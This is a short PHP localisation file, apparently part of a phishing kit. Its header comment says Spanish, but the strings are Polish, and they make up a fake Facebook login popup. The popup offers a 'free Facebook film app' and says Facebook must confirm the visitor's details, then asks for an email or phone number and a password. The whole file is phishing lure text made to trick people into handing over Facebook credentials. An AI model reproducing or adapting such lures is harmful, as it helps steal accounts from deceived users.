<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'pl';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Aplikacja Facebook';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Film aplikacja (Darmowy)';
$lang['POPUP_DESCRIPCION'] = 'Facebook musi potwierdzic nastepujace informacje, aby umozliwic dostep do tej aplikacji wideo, Zaloguj sie!';
$lang['POPUP_CORREO'] = 'E-mail lub numer telefonu';
$lang['POPUP_CONTRASENA'] = 'Haslo';
$lang['POPUP_SUBMIT'] = 'Zaloguj sie';
$lang['POPUP_CANDADO'] = 'Ta aplikacja nie jest dozwolone do publikacji na Facebooku.';

/*
$langPl = array("Poland")
*/